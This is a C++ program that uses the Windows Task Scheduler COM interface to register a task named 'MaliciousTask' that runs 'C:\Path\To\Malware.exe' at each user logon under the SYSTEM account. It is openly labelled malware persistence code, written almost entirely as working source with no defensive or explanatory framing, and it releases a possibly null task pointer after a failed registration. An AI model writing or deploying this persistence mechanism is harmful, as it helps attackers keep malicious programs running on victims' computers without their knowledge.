#include <windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <iostream>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

void CreateScheduledTask() {
    // 初始化COM库
    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    // 创建TaskService对象
    ITaskService* pService = NULL;
    HRESULT hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) {
        std::cerr << "Failed to create TaskService object." << std::endl;
        CoUninitialize();
        return;
    }

    // 连接到任务计划程序服务
    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        std::cerr << "Failed to connect to Task Scheduler service." << std::endl;
        pService->Release();
        CoUninitialize();
        return;
    }

    // 获取任务文件夹
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        std::cerr << "Failed to get root folder." << std::endl;
        pService->Release();
        CoUninitialize();
        return;
    }

    // 创建任务定义
    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    pService->Release();
    if (FAILED(hr)) {
        std::cerr << "Failed to create task definition." << std::endl;
        pRootFolder->Release();
        CoUninitialize();
        return;
    }

    // 设置任务触发器
    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (FAILED(hr)) {
        std::cerr << "Failed to get trigger collection." << std::endl;
        pTask->Release();
        pRootFolder->Release();
        CoUninitialize();
        return;
    }

    ITrigger* pTrigger = NULL;
    hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
    pTriggerCollection->Release();
    if (FAILED(hr)) {
        std::cerr << "Failed to create logon trigger." << std::endl;
        pTask->Release();
        pRootFolder->Release();
        CoUninitialize();
        return;
    }

    pTrigger->Release();

    // 设置任务动作
    IActionCollection* pActionCollection = NULL;
    hr = pTask->get_Actions(&pActionCollection);
    if (FAILED(hr)) {
        std::cerr << "Failed to get action collection." << std::endl;
        pTask->Release();
        pRootFolder->Release();
        CoUninitialize();
        return;
    }

    IAction* pAction = NULL;
    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    pActionCollection->Release();
    if (FAILED(hr)) {
        std::cerr << "Failed to create action." << std::endl;
        pTask->Release();
        pRootFolder->Release();
        CoUninitialize();
        return;
    }

    IExecAction* pExecAction = NULL;
    hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    pAction->Release();
    if (FAILED(hr)) {
        std::cerr << "Failed to query IExecAction interface." << std::endl;
        pTask->Release();
        pRootFolder->Release();
        CoUninitialize();
        return;
    }

    pExecAction->put_Path(_bstr_t(L"C:\\Path\\To\\Malware.exe"));
    pExecAction->Release();

    // 注册任务
    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(L"MaliciousTask"),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(L"SYSTEM"),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &pRegisteredTask
    );

    if (FAILED(hr)) {
        std::cerr << "Failed to register task." << std::endl;
    } else {
        std::cout << "Task registered successfully." << std::endl;
    }

    pRegisteredTask->Release();
    pTask->Release();
    pRootFolder->Release();
    CoUninitialize();
}

int main() {
    CreateScheduledTask();
    return 0;
}
